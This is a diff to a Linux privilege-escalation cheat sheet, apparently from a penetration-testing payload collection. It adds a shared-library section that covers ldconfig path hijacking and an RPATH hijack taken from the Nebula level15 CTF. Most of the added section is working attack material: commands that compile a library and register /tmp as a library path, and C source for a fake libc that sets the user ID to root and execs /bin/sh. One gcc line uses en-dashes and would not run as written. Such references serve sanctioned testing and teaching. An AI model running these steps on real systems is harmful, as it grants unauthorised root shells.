@@ -27,9 +27,13 @@
     * [Doas](#doas)
 * [GTFOBins](#gtfobins)
 * [Wildcard](#wildcard)
+* [NFS Root Squashing](#nfs-root-squashing)
+* [Shared Library](#shared-library)
+    * [ldconfig](#ldconfig)
+    * [RPATH](#rpath)
 * [Groups](#groups)
     * [Docker](#docker)
-    * [LXC/LXD](#lxc-lxd)
+    * [LXC/LXD](#lxclxd)
 
 ## Checklists
 
@@ -293,6 +297,68 @@ cp /bin/bash .
 # set suid permission
 chmod +s bash 	
 ```
+
+## Shared Library
+
+### ldconfig
+
+Identify shared libraries with `ldd`
+
+```powershell
+$ ldd /opt/binary
+    linux-vdso.so.1 (0x00007ffe961cd000)
+    vulnlib.so.8 => /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)
+    /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000)        
+```
+
+Create a library in `/tmp` and activate the path.
+
+```powershell
+gcc –Wall –fPIC –shared –o vulnlib.so /tmp/vulnlib.c
+echo "/tmp/" > /etc/ld.so.conf.d/exploit.conf && ldconfig -l /tmp/vulnlib.so
+/opt/binary
+```
+
+### RPATH
+
+```powershell
+level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
+ 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
+ 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
+
+level15@nebula:/home/flag15$ ldd ./flag15 
+ linux-gate.so.1 =>  (0x0068c000)
+ libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
+ /lib/ld-linux.so.2 (0x005bb000)
+```
+
+By copying the lib into `/var/tmp/flag15/` it will be used by the program in this place as specified in the `RPATH` variable.
+
+```powershell
+level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/
+
+level15@nebula:/home/flag15$ ldd ./flag15 
+ linux-gate.so.1 =>  (0x005b0000)
+ libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
+ /lib/ld-linux.so.2 (0x00737000)
+```
+
+Then create an evil library in `/var/tmp` with `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
+
+```powershell
+#include<stdlib.h>
+#define SHELL "/bin/sh"
+
+int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
+{
+ char *file = SHELL;
+ char *argv[] = {SHELL,0};
+ setresuid(geteuid(),geteuid(), geteuid());
+ execve(file,argv,0);
+}
+```
+
+
 
 
 ## Groups
